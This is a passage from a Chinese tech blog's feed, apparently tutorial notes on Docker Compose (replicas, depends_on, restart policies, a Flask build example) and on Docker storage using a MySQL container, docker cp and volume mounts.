id="collapse-0zg10flmrh9u69"><pre><code class="hljs shell">vi web.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-shbj4vlmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-shbj4vlmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span><span class="hljs-attr">services:</span>    <span class="hljs-attr">busybox:</span>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">sh</span>        <span class="hljs-attr">image:</span> <span class="hljs-string">"busybox:latest"</span>        <span class="hljs-attr">tty:</span> <span class="hljs-literal">true</span>        <span class="hljs-attr">stdin_open:</span> <span class="hljs-literal">true</span>        <span class="hljs-attr">networks:</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">"custom"</span>    <span class="hljs-attr">python:</span>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">web</span>        <span class="hljs-attr">image:</span> <span class="hljs-string">"python"</span>        <span class="hljs-attr">network_mode:</span> <span class="hljs-string">"host"</span>        <span class="hljs-attr">command:</span> <span class="hljs-string">"python -m http.server 8000"</span><span class="hljs-attr">networks:</span>    <span class="hljs-attr">custom:</span>        <span class="hljs-attr">name:</span> <span class="hljs-string">"custom"</span></code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bsuwjulmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-bsuwjulmrh9u69"><pre><code class="hljs shell">docker compose -f web.yml -p web up -d</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141545186341_141_image-20230906134113946.png" alt="image-20230906134113946"><figcaption aria-hidden="true">image-20230906134113946</figcaption></figure><ol start="2" type="1"><li>创建Project并验证</li></ol><p>web.yml创建成功后，我们来创建Project，需要注意的是在创建Proejct时，<code>-f[配置文件名]</code>参数需要放在up命令之前。在Proejct创建之后我们来验证自定网络的创建和容器参数的指定。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ycab77lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-ycab77lmrh9u69"><pre><code class="hljs shell">docker inspect -f '{"Tty":{{.Config.Tty}},"OpenStdin":{{.Config.OpenStdin}}}' sh | jqdocker inspect -f "{{json .NetworkSettings.Networks}}" sh | jq</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141548725400_786_image-20230906134131894.png" alt="image-20230906134131894"><figcaption aria-hidden="true">image-20230906134131894</figcaption></figure><ol start="3" type="1"><li>查看配置信息</li></ol><p>当Project创建成功后使用<code>docker compose convert</code>命令，可以显示service中某个容器的的配置信息。我们可以看到显示的配置信息中，包括yml中指定的选项，也包括yml中没有指定的默认选项。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lfo9felmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-lfo9felmrh9u69"><pre><code class="hljs shell">docker compose -f web.yml -p web convert busyboxdocker compose -f web.yml -p web convert python</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141552348830_501_image-20230906134142775.png" alt="image-20230906134142775"><figcaption aria-hidden="true">image-20230906134142775</figcaption></figure><h3 id="yml的其他配置项目">YML的其他配置项目</h3><p>在本小节中我们再来看三个并不是和docker run 命令参数有对应关系的dockercompose属性值的用法。</p><table><thead><tr class="header"><th>deploy.replicas</th><th>可以选择Service中容器的部署个数。</th></tr></thead><tbody><tr class="odd"><td>depends_on</td><td>可以选择Service启动的先后顺序</td></tr><tr class="even"><td>restart</td><td>设置Service的重启策略</td></tr></tbody></table><ol type="1"><li>容器个数</li></ol><p>首先我们来看<code>deploy.replicas</code>，之前我们提到过在<code>docker  compose</code>中的层次结构为，<code>project-&gt;service-&gt;container</code>，这里面的service指的是不同的容器配置，而container是指可以为相同的配置建立多个容器实例。配置容器实例个数的属性就是<code>deploy.replicas</code>。我们使用<code>vi</code>创建一个<code>replicas.yml</code>文件以演示配置选项。</p><p>在编写配置文件时，我们要注意由于我们需要在相同的配置下创建多个容器，因此我们不能在配置中用<code>container_name</code>属性为容器指定一个固定的名字。因此我们需要删除此字段，由启动自动分配名字。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9hdhu1lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-9hdhu1lmrh9u69"><pre><code class="hljs shell">vi replicas.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kadyaclmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-kadyaclmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span><span class="hljs-attr">services:</span>    <span class="hljs-attr">busybox:</span>        <span class="hljs-attr">image:</span> <span class="hljs-string">"busybox:latest"</span>        <span class="hljs-attr">tty:</span> <span class="hljs-literal">true</span>        <span class="hljs-attr">stdin_open:</span> <span class="hljs-literal">true</span>        <span class="hljs-attr">deploy:</span>            <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span></code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8ss8fslmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-8ss8fslmrh9u69"><pre><code class="hljs shell">docker compose -f replicas.yml -p replicas up -ddocker compose -f replicas.yml -p replicas ps</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141557051770_456_image-20230906134411157.png" alt="image-20230906134411157"><figcaption aria-hidden="true">image-20230906134411157</figcaption></figure><ol start="2" type="1"><li>启动顺序</li></ol><p>在容器启动时，如果不同service在启动时有互相依赖关系，比如redis缓存要先于web服务启动，这种情况下就可以使用<code>depends_on</code>来管理service的启动顺序。我们使用vi创建一个<code>dependson.yml</code>文件以演示启动顺序选项。会发现servie严格按照先后顺序进行了启动</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pyv74zlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-pyv74zlmrh9u69"><pre><code class="hljs shell">vi dependson.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yvcva3lmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-yvcva3lmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span><span class="hljs-attr">services:</span>    <span class="hljs-attr">busybox-before:</span>        <span class="hljs-attr">image:</span> <span class="hljs-string">"busybox"</span>        <span class="hljs-attr">tty:</span> <span class="hljs-literal">true</span>        <span class="hljs-attr">stdin_open:</span> <span class="hljs-literal">true</span>    <span class="hljs-attr">busybox-after:</span>        <span class="hljs-attr">image:</span> <span class="hljs-string">"busybox"</span>        <span class="hljs-attr">tty:</span> <span class="hljs-literal">true</span>        <span class="hljs-attr">stdin_open:</span> <span class="hljs-literal">true</span>        <span class="hljs-attr">depends_on:</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">"busybox-before"</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">"busybox"</span>    <span class="hljs-attr">busybox:</span>        <span class="hljs-attr">image:</span> <span class="hljs-string">"busybox"</span>        <span class="hljs-attr">tty:</span> <span class="hljs-literal">true</span>        <span class="hljs-attr">stdin_open:</span> <span class="hljs-literal">true</span>        <span class="hljs-attr">depends_on:</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">"busybox-before"</span></code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tbo8ohlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-tbo8ohlmrh9u69"><pre><code class="hljs shell">docker compose -f dependson.yml -p dependson up -d</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141600332437_952_image-20230906134537758.png" alt="image-20230906134537758"><figcaption aria-hidden="true">image-20230906134537758</figcaption></figure><ol start="3" type="1"><li>重启策略</li></ol><p>在生产环境中，容器中服务难免会因为各种问题出现异常，错误，从而导致服务进程崩溃。一旦这种情况发生就会导致局部服务不可用，如果是关键服务出现问题，甚至会影响整个应用得稳定性。</p><p>因此在生产环境中，我们一般会配置使用<code>restart</code>属性。该属性可以根据值得不同设定容器得自动重启策略。常用得属性值包括：<code>no</code>不自动重启，<code>always</code>总是自动重启，<code>on-failure</code>错误退出时重启。</p><p>接下来我们启动一个busybox容器，在容器启动时执行<code>sleep 10</code>。这个命令表示命令行会在10秒后退出，以模拟容器服务出现错误。在project启动后等待超过10秒，然后再查看状态，会发现由于设置了always策略，容器会在退出后重新启动。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tk13wwlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-tk13wwlmrh9u69"><pre><code class="hljs shell">vi restart.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kboz92lmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-kboz92lmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span><span class="hljs-attr">services:</span>    <span class="hljs-attr">busybox-auto:</span>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">busybox-auto</span>        <span class="hljs-attr">image:</span> <span class="hljs-string">"busybox"</span>        <span class="hljs-attr">command:</span> <span class="hljs-string">sleep</span> <span class="hljs-number">10</span>        <span class="hljs-attr">restart:</span> <span class="hljs-string">"always"</span></code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zrc9w2lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-zrc9w2lmrh9u69"><pre><code class="hljs shell">docker compose -f restart.yml -p restart up -d[等待超过10秒]docker compose -f restart.yml -p restart ps</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141603517229_285_image-20230906134857664.png" alt="image-20230906134857664"><figcaption aria-hidden="true">image-20230906134857664</figcaption></figure><blockquote><p>注：蓝框中已启动9秒而非50+秒，说明中间重启过</p></blockquote><h3 id="flask的build联动案例">Flask的build联动案例</h3><p>在实际开发应用得过程中，我们往往不会直接使用原生容器进行部署，而是需要使用开发者自行build的镜像。这种情况下开发者部署应用时，需要先执行<code>docker build</code>构建镜像，然后再执行<code>docker compose up</code>来运行镜像。</p><p>除了这种方式之外，我们还可以在YML配置文件中使用<code>build</code>属性值，这种情况下<code>docker compose</code>在创建project之前会先执行<code>docker build</code>生成镜像，然后再创建容器。简化了开发者的部署工作。</p><p>本小节中我们就来通过一个Python语言的<code>Flask</code>框架来演示在开发过程中如何联动镜像的打包和部署。</p><ol type="1"><li>环境准备</li></ol><p>首先我们需要构建三个文件，分别是应用开发的源代码文件<code>main.py</code>，制作镜像的打包文件<code>Dockfile</code>，和容器联动的配置文件<code>build.yml</code>。首先我们来构建<code>main.py</code>和<code>Dockfile</code>。</p><p>在<code>main.py</code>中我们通过Flask框架实现了一个简单的Http服务器。具体代码原理可以参考源码中的注释，在此不做过多讲解。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xunpvelmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-xunpvelmrh9u69"><pre><code class="hljs shell">mkdir appvi app/main.py</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-poqlv0lmrh9u69"></i><span>python</span><div class="collapse show" id="collapse-poqlv0lmrh9u69"><pre><code class="hljs python"><span class="hljs-comment"># 导入Flask类</span><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask <span class="hljs-comment"># 创建app对象</span>app = Flask(__name__) <span class="hljs-comment"># 将对路径"/"得访问路由到函数index上</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <span class="hljs-keyword">return</span> <span class="hljs-string">'网页首页\n'</span><span class="hljs-comment"># 将对路径"/Host"得访问路由到函数index上</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/host'</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">host</span>():    <span class="hljs-keyword">return</span> <span class="hljs-string">'访问Host路径\n'</span><span class="hljs-comment"># 启动app对象中得服务，并指导服务端口为8000</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    app.run(host=<span class="hljs-string">"0.0.0.0"</span>, port=<span class="hljs-number">8000</span>)</code></pre></div></div><p>接下来我们来编写<code>Dockerfile</code>，这里我们主要做几件事：首先通过<code>pip</code>安装<code>Flask</code>框架，然后将<code>main.py</code>源码文件复制到<code>/app/</code>目录下，接下来设置<code>/app</code>为工作目录，最后使用CMD设置容器的启动命令。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1s030glmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-1s030glmrh9u69"><pre><code class="hljs shell">vi app/Dockerfile</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-chz1bdlmrh9u69"></i><span>dockerfile</span><div class="collapse show" id="collapse-chz1bdlmrh9u69"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> python<span class="hljs-keyword">RUN</span><span class="language-bash"> pip install Flask</span><span class="hljs-keyword">ADD</span><span class="language-bash"> main.py /app/main.py</span><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app/</span><span class="hljs-keyword">CMD</span><span class="language-bash"> python main.py</span></code></pre></div></div><ol start="2" type="1"><li>编写配置文件</li></ol><p>源代码文件和打包文件编辑完毕后，我们继续通过<code>vi</code>来编写配置文件<code>build.yml</code>。在配置文件中，我们使用<code>build</code>属性值代替<code>image</code>。如果在执行<code>docker build</code>时使用的是默认的打包配置文件，那么将<code>build</code>的属性值设置为<code>Dockerfile</code>文件所在目录即可。</p><p>如果需要指定打包文件名，则需要将<code>build</code>的属性值设置为对象。对象中包含<code>context</code>和<code>dockerfile</code>两个属性值，分别表示配置文件所在路径和配置文件名。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-073wuvlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-073wuvlmrh9u69"><pre><code class="hljs shell">vi build.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vaao1nlmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-vaao1nlmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span><span class="hljs-attr">services:</span>    <span class="hljs-attr">app:</span>        <span class="hljs-attr">build:</span> <span class="hljs-string">app/</span><span class="hljs-comment">#       build: </span><span class="hljs-comment">#           context: app/</span><span class="hljs-comment">#           dockerfile: Dockerfile</span>        <span class="hljs-attr">ports:</span>             <span class="hljs-bullet">-</span> <span class="hljs-string">"8080:8000"</span>        <span class="hljs-attr">restart:</span> <span class="hljs-string">"always"</span></code></pre></div></div><ol start="3" type="1"><li>验证部署结果</li></ol><p>文件编写完成后我们即可进行编译打包和project部署的联动，proejct部署成功后。我们通过<code>docker compose ps</code>命令进行查看，发现容器使用了自动打包的镜像<code>build-app</code>。</p><p>最后我们使用<code>curl</code>访问8080端口映射，验证服务部署成功。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-w7zxujlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-w7zxujlmrh9u69"><pre><code class="hljs shell">docker compose -f build.yml -p build up -ddocker compose -f build.yml -p build pscurl 127.0.0.1:8080curl 127.0.0.1:8080/host</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141609065118_414_image-20230906135657253.png" alt="image-20230906135657253"><figcaption aria-hidden="true">image-20230906135657253</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出Docker应用-Docker存储模型</title>
    <link href="/posts/30866/"/>
    <url>/posts/30866/</url>
    
    <content type="html"><![CDATA[<h1 id="深入浅出docker应用-docker存储模型">深入浅出docker应用-Docker存储模型</h1><h2 id="容器的配置和存储">容器的配置和存储</h2><h3 id="快速上手">快速上手</h3><p>在上面的实验中我们学习了容器的网络用法和网络模型，接下来我们来学习几种配置容器中的服务，以及管理容器存储系统的方式。</p><ol type="1"><li>容器环境变量</li></ol><p>在容器的配置中，最简单的方式是配置容器的环境变量。当我们使用dockerrun运行容器是，可以添加<code>-e</code>参数为容器设置环境变量。在配置环境变量时，也可以和<code>-p</code>参数一样同时设置多个<code>-e</code>参数。</p><p>参数配置完成后，进入容器使用<code>echo</code>命令输出设置的环境变量。验证<code>-e</code>参数的使用。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3v1lvclmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-3v1lvclmrh9u69"><pre><code class="hljs shell">docker run -it --name env1 -e ECHO=环境变量 -e NUM=123456 busybox</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7fmbjnlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-7fmbjnlmrh9u69"><pre><code class="hljs shell">echo $ECHO $NUMexit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122021966682_985_image-20230905205658055.png" alt="image-20230905205658055"><figcaption aria-hidden="true">image-20230905205658055</figcaption></figure><ol start="2" type="1"><li>容器文件复制</li></ol><p>容器中的另一个存储方式是使用<code>docker cp</code>命令，在宿主机和容器之间进行文件的复制。在文件复制时容器中文件的描述方式为，<code>容器名:容器文件路径</code>。</p><p>我们在宿主机中通过<code>echo</code>命令创建文件<code>local.txt</code>。然后创建容器<code>file1</code>，接下来通过<code>docker cp</code>复制到容器中。最后在容器中通过<code>cat</code>命令显示文件命令。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-78ljjolmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-78ljjolmrh9u69"><pre><code class="hljs shell">echo 本机生成的文件 &gt; local.txtdocker run -itd --name file1 busyboxdocker cp local.txt file1:/local.txtdocker exec file1 cat local.txt</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122024468499_912_image-20230905205826324.png" alt="image-20230905205826324"><figcaption aria-hidden="true">image-20230905205826324</figcaption></figure><ol start="3" type="1"><li>文件的挂载</li></ol><p>除了使用<code>docker cp</code>文件复制的办法之外，我们还可以在创建容器的时候使用<code>-v</code>参数将宿主机中的文件直接挂载到容器中。该参数的用法为<code>-v 宿主机文件的绝对路径:容器文件的绝对路径</code>。这种方式在后面会进行详细讲解。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-m7s7dxlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-m7s7dxlmrh9u69"><pre><code class="hljs shell">docker run -itd --name file2 -v $(pwd)/local.txt:/mount.txt busyboxdocker exec file2 cat mount.txt</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122028923771_476_image-20230905210015001.png" alt="image-20230905210015001"><figcaption aria-hidden="true">image-20230905210015001</figcaption></figure><h3 id="mysql镜像的基本用法">MYSQL镜像的基本用法</h3><p>在上一个步骤中，我们讲解了容器的管理和存储的基本用法。接下来我们用一个MySQL容器来演示这些用法的具体实战。为了实验演示，我们先来学习一下MySQL容器的基本用法。</p><p>传统启动MySQL服务的方式，是在操作系统中安装MySQL的服务，并且通过<code>systemctl</code>命令进行启动，但是这种方式需要在系统目录中复制相应的文件，同时向系统中注册服务。这样的流程不但复杂，一旦服务的文件或者配置被破坏或者篡改会导致服务不可用，且难以定位问题。</p><p>因此在使用了Docker之后，我们可以从官方仓库中下载已经配置好的MySQL容器镜像。然后直接通过镜像的方式启动服务。这样做不会在宿主机的系统中保存任何文件和配置。服务的稳定性大大提高。</p><ol type="1"><li>MySQL容器的启动配置</li></ol><p>在本实验中我们使用<strong>mysql容器的8.0版本</strong>进行实验。我们来看一下MySQL容器镜像的启动配置方式，MySQL数据库是通过网络对外提供服务的，当服务启动后，默认会打开并监听3306端口，用来接受客户端得各种命令。</p><p>在这里我们使用默认的Bridge网络模型，同时使用<code>-p</code>参数设置端口映射，将MySQL得服务暴露到宿主机的网卡上。</p><p>除此之外在启动MySQL容器得时候，我们还可以通过设置<code>MYSQL_ROOT_PASSWORD</code>环境变量的方式，设置MySQL中<code>root</code>用户的初始化密码。这里我们使用<code>-e</code>参数来设置。</p><p>在配置好启动命令之后，我们启动容器，并且使用<code>bash</code>登录到容器中，验证环境变量的配置成功。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-p960dllmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-p960dllmrh9u69"><pre><code class="hljs shell">docker pull mysql:8.0docker run -itd --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=[MYSQL密码] mysql:8.0docker exec -it mysql bin/bash</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lylxzulmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-lylxzulmrh9u69"><pre><code class="hljs shell">echo $MYSQL_ROOT_PASSWORDexit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122032462368_350_image-20230905210810439.png" alt="image-20230905210810439"><figcaption aria-hidden="true">image-20230905210810439</figcaption></figure><ol start="2" type="1"><li>进入MySQL服务的控制台</li></ol><p>MySQL服务启动后，我们可以使用mysql命令登录服务得控制台，该命令的用法为<code>mysql -u用户名 -p</code>，其中<code>-p</code>表示登录账户需要密码。命令执行后输入在上一个步骤中设置的密码即可进入控制台。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g90yf6lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-g90yf6lmrh9u69"><pre><code class="hljs shell">docker exec -it mysql mysql -uroot -p[输入MYSQL密码]</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122037142229_199_image-20230905210931741.png" alt="image-20230905210931741"><figcaption aria-hidden="true">image-20230905210931741</figcaption></figure><ol start="3" type="1"><li>MySQL控制台验证命令</li></ol><p>在MySQL控制台中，我们可以使用<code>status</code>命令查看服务的运行状态，使用<code>show Database;</code>查看服务中的数据库，也可以使用<code>help</code>命令查看其他命令的用法。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2nh8k8lmrh9u69"></i><span>mysql</span><div class="collapse show" id="collapse-2nh8k8lmrh9u69"><pre><code class="hljs mysql">statusshow Databases;helpexit</code></pre></div></div><h3 id="复制修改mysql配置文件">复制修改MYSQL配置文件</h3><p>在MySQL容器中，环境变量只能对一些简单的属性进行配置，实际上大多数属性都是通过位于<code>/etc/mysql/my.cnf</code>的配置文件进行管理的。接下来我们来学习如何使用文件复制的方式进行配置管理。</p><ol type="1"><li>查看MySQL配置属性值</li></ol><p>在MySQL服务中包含了大量的属性值，这些属性值影响服务的运行状态。如果希望修改属性值，就需要修改<code>my.cnf</code>配置文件。在本次实验中，我们使用一个对服务影响不大的属性<code>general_log</code>来演示配置文件的用法。</p><p>首先我们先进入控制台，然后使用<code>show variables</code>命令查看设置前的属性值。可以发现属性值现在为<code>OFF</code>。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122041622614_523_image-20230905212216832.png" alt="image-20230905212216832"><figcaption aria-hidden="true">image-20230905212216832</figcaption></figure><ol start="2" type="1"><li>复制修改配置文件</li></ol><p>如果单纯的为了修改配置，我们可以直接在容器中修改配置文件。但是为了防止容器被删除或者被破坏时，修改好的配置文件丢失，我们先使用<code>docker cp</code>将配置文件复制到宿主机中的<code>/root/mysql/config/</code>目录中作为副本。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1yztv2lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-1yztv2lmrh9u69"><pre><code class="hljs shell">mkdir -p /root/mysql/config/docker cp mysql:/etc/my.cnf /root/mysql/config/my.cnfcat /root/mysql/config/my.cnf</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122046212049_831_image-20230905212510404.png" alt="image-20230905212510404"><figcaption aria-hidden="true">image-20230905212510404</figcaption></figure><ol start="3" type="1"><li>当配置文件复制完毕后，我们使用vi编辑该文件，在[mysqld]段落的末尾添加如下内容，修改后的段落如下。</li></ol><ul><li>输入<code>/secure-file-priv</code>按回车可快速定位，修改<code>secure-file-priv</code>的值为<code>NULL</code>。</li><li>添加<code>general_log = 1</code></li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-r4hzcklmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-r4hzcklmrh9u69"><pre><code class="hljs shell">vi /root/mysql/config/my.cnf</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rt7ybklmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-rt7ybklmrh9u69"><pre><code class="hljs shell">general_log = 1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122048592517_741_image-20230905212718393.png" alt="image-20230905212718393"><figcaption aria-hidden="true">image-20230905212718393</figcaption></figure><h3 id="挂载mysql配置文件">挂载MYSQL配置文件</h3><p>在上一步我们完成了配置文件的复制和修改，接下来我们来将配置文件应用到容器服务中</p><ol type="1"><li>应用配置文件</li></ol><p>我们将配置文件复制回容器中，为了让配置文件生效，我们需要使用dockerrestart命令重新启动容器。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5oae1slmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-5oae1slmrh9u69"><pre><code class="hljs shell">docker cp /root/mysql/config/my.cnf mysql:/etc/my.cnfdocker restart mysql</code></pre></div></div><figure><img src="https://ucc.alicdn.com/pic/developer-ecology/zfjcruuaylg7m_e5d7202a965b493a9ed0349b2f8df7fe.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><ol 